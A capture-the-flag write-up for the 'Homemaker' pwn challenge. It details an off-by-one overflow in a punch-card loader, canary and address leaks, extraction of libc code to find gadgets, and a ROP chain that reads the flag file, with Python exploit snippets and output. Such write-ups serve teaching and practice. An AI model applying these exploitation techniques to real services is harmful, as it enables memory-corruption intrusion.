# Homemaker — Pwn (Hard)

**Flag:** `sun{the_future_is_now_today_well_wait_how_are_you_reading_this}`
**Instance:** `nc sunshinectf.games 26008`, the attachment is only the `homemaker` binary, no libc.

## Challenge

A punch-card loader: you send a card up, the server checks a key, copies the card into memory, and
prints that memory back out. No libc provided, no hints.

Two bugs combine into the solution. The card loading loop uses `<=`, so it writes exactly one byte
too many, and that extra byte is the CRC of the frame itself, whose value the player chooses:
`capacity` goes from 256 to 511 and then to 0x7f8, turning a one-byte overflow into a 2041-byte
overflow. The rest is harder: the binary does not contain a single `syscall` instruction, and the
server's libc is not provided. The answer is to use the memory-read primitive just gained to pull
libc machine code off the server, then read the two needed gadgets out of it.

## Initial Analysis

### Protocol

The frame is identical in both directions:

```
ESC '[' <len:u16 BE> <payload[len]> <crc8(payload)> ESC '\'
```

`crc8` (function `0x11e9`) is multiplication by `x^8` in `GF(2^8)` with the polynomial `0x12f`:

```python
def crc8(data):
    acc = 0
    for b in data:
        acc ^= b
        for _ in range(8):
            acc = ((acc << 1) ^ 0x2F) & 0xFF if acc & 0x80 else (acc << 1) & 0xFF
    return acc
```

Command 1 accepts the service card, the hard-coded comparison key at `0x12a7` is `0x1337c35f`.
Command 2 copies the card into `mem`, command 3 prints `mem`. That is all.

### Off-by-one in the card loading function (`0x174c`)

```c
n = len - 1;
if (n > capacity) return 0xe2;
for (i = 0; i <= n; ++i) mem[i] = p[1+i];      //  <=  là điểm chết: ghi n+1 byte
```

The loop is inclusive, so it writes `n+1` bytes. Picking `len = 257` gives `n = 256 = capacity`, the
extra byte lands exactly on `mem[256]`, i.e. the low byte of `capacity` (located at `mem+0x100`), and
the value written there is precisely the frame's CRC byte, which the sender chooses freely by editing
one last payload byte:

```python
def with_crc(payload, want):          # đổi byte cuối để crc8(payload) == want
    for x in range(256):
        p = bytearray(payload); p[-1] = x
        if crc8(bytes(p)) == want: return bytes(p)

serv.send(frame(with_crc(bytes([2]) + b"A"*256, 0xFF)))   # capacity: 0x100 -> 0x1FF
```

`capacity = 0x1FF` gives two things: command 3 prints 511 bytes of the stack, and command 2 may write
up to 512 bytes. Among those 512 bytes sits `mem[0x100..0x101]`, i.e. `capacity` itself (a u16), so a
second 512-byte card sets `capacity = 0x7F8` in turn. Since `read_frame` accepts payloads up to
`0x7F9` bytes (`len+7 <= 0x800`), a single card covers `mem[0..0x7F8]` = 2041 bytes, the entire frame
of the dispatcher.

### Leak (`0x1810`)

Layout of the `mem` region (dispatcher: `sub rsp, 0x120`; `mem = rbp-0x110`):

| offset | contents |
| --- | --- |
| `0x100` | `capacity` (u16) |
| `0x102` | number of cards loaded (u16) |
| `0x108` | stack canary |
| `0x110` | saved rbp = `main`'s rbp, from which the stack address follows |
| `0x118` | return address = `base + 0x1a9f`, from which the PIE base follows |

```python
canary     = mem[0x108:0x110]
saved_rbp  = u64(mem[0x110])
retaddr    = u64(mem[0x118]);  base = retaddr - 0x1a9f
mema       = saved_rbp - 0x130          # đã kiểm chứng bằng cách đọc ngược lại chính nó
```

`mema` is trustworthy because the ROP calling `0x1810(mema)` prints back exactly the card just sent.

## Approaches Ruled Out

### `system()` leads nowhere

The binary imports `system` and the dispatcher already has a command 5 calling
`system("/bin/echo -n ''")`, so the challenge's trap is "have ROP put a command string into `mem` and
call `system`". This was tried seriously on remote:

```
cmd=echo HIJI          0.55s  ...*** stack smashing detected ***: terminated
cmd=/bin/echo HIJI     0.52s  ...*** stack smashing detected ***: terminated
cmd=sleep 5            0.54s  ...*** stack smashing detected ***: terminated
```

The "stack smashing" string from `main` proves `system()` runs and returns normally, and that stderr
has a path out to the socket. But `sleep 5` causes no delay at all, meaning no child process exists:
the challenge image has no `/bin/sh` (or `clone` is blocked). Every shell route is closed, leaving
only ORW via raw syscalls - and the binary has no syscall:

```
$ python -c "d=open('files/homemaker','rb').read(); print(d.count(b'\x0f\x05'), d.count(b'\xcd\x80'))"
0 0
```

The libc is not provided either.

## Exploit Chain

### Step 1 - Pull libc machine code off the server

`0x1810(ctx)` = `emit(0, ctx, [ctx+0x100])`: emits `len = [ctx+0x100]` bytes counted from `ctx`, with
the constraint `len + 8 <= 0x800`. Hence:

* If `ctx` lies inside the region we can write (the 2041-byte card itself), we set the read length
  ourselves: arbitrary reads of up to 2040 bytes around the stack, and `.bss` is readable too -
  putting the gate at `base+0x4090` (inside the emit buffer) lets `ctx = base+0x3F90` suck out 2039
  bytes covering `.dynamic` + `.got` + `.data` + `.bss`. From that we get the server's libc addresses
  of `write`, `read`, `system`, `setvbuf`, `__libc_start_main`.
* If `ctx` points into libc, the length is two luck-of-the-draw bytes. Still worth trying, because
  libc functions are interleaved with `0f 1f 40 00` padding and zero immediates, so within 256 bytes
  there will certainly be a few positions yielding `len <= 0x7f8`. Firing at 20 positions gets it.

Each probe carries a marker read from the card (`HMCARD!` + sequence number) so it is known which
`ctx` produced which blob. Results on remote:

```
[*] write=0x7b9887cfd870
    hit  ctx=write+0x1764  len=1976      <- 1976 byte mã máy libc thật
    syscall   : write+0x1779, +0x17a9, +0x17d9, +0x180c, +0x1839, +0x1869, +0x1899
    pop rsi; ret : write+0x1a02          (0x5e 0xc3)
```

The whole wrapper has the form `mov eax, imm; syscall; cmp rax,-4095; jae +1; ret`, and jumping
straight into `syscall` means both following branches (success and error) `ret` back into the chain,
so it is usable as a `syscall; ret`. Re-run on a different connection, the blob is byte-identical
once normalised back to `write`.

Where does each connection's `write` address come from when ASLR changes constantly? From the stack
dump: `mem[0x298]` is a pointer inside libc's mapping, and the difference `mem[0x298] - write` is
exactly `0x11e790` across all three connections measured. No extra ROP calls, no need to identify the
libc build.

```python
w = u64(mem[0x298]) - 0x11E790
SYSCALL, POP_RSI = w + 0x1779, w + 0x1a02
```

### Step 2 - Setting syscall arguments without `pop rsi/rdx/rax` gadgets

Three observations:

1. After `0x1810(ctx)` returns, `rsi = base+0x4060` (the emit buffer, a `.bss` region whose contents
   we control) and `rdx = len + 8`, so the read/write length is set by choosing the gate in the card.
2. `read@plt` and `write@plt` are pure wrappers that load `eax = 0` / `eax = 1` themselves, so it does
   not matter what `rax` holds when calling these two functions.
3. `read`'s return value is the number of bytes read. If the socket holds exactly 2 bytes, `read`
   returns 2, and the syscall return value is not overwritten by any function, so `rax = 2 = __NR_open`.
   To get that, simply send exactly 2 bytes.

`open(path, O_RDONLY, mode)`: `rdi` = path (there is a `pop rdi`), `rsi` = 0 (the `pop rsi` is taken
from libc), `rdx` = mode is ignored when `O_CREAT` is absent, so a garbage value is harmless.

The final chain (2041-byte card: path at `mem+0x600`, gate at `mem+0x700` = 249 so `rdx = 257`, chain
at `mem+0x118`):

```
pop rdi, mema+0x600 ; 0x1810        # rsi = emit buf, rdx = 257, rax = 0
pop rdi, 0          ; read@plt      # read(0, buf, 257): mình đưa đúng 2 byte -> rax = 2
pop rsi, 0                          # flags = O_RDONLY
pop rdi, mema+0x600                 # rdi = "/ctf/flag.txt"
syscall                             # open  -> rax = fd (3)
pop rdi, mema+0x600 ; 0x1810        # rsi = buffer, rdx = 257
pop rdi, 3          ; read@plt      # read(3, emit buf, 257)  -> cờ vào .bss
pop rdi, 1          ; write@plt     # write(1, emit buf, 257) -> cờ ra socket
```

No shell needed, no libc base needed, and only two addresses, both read off the server itself.

## Flag

```
$ python exploit_homemaker.py 3
[+] base=0x58c6dfbcf000 mema=0x7ffec7f52670 canary=00b00b45f118c013 (dump 2040 bytes, crc ok=True)
[*] write=0x7c49b6240870  syscall=0x7c49b6241fe9  pop_rsi=0x7c49b6242272  chain=184 bytes
[*] 1036 bytes back:
...
sun{the_future_is_now_today_well_wait_how_are_you_reading_this}

[+] FLAG: sun{the_future_is_now_today_well_wait_how_are_you_reading_this}
```

## Reproduce

```bash
python exploit_homemaker.py 3        # 3 = số lần thử; cần hmlib.py cùng thư mục
```
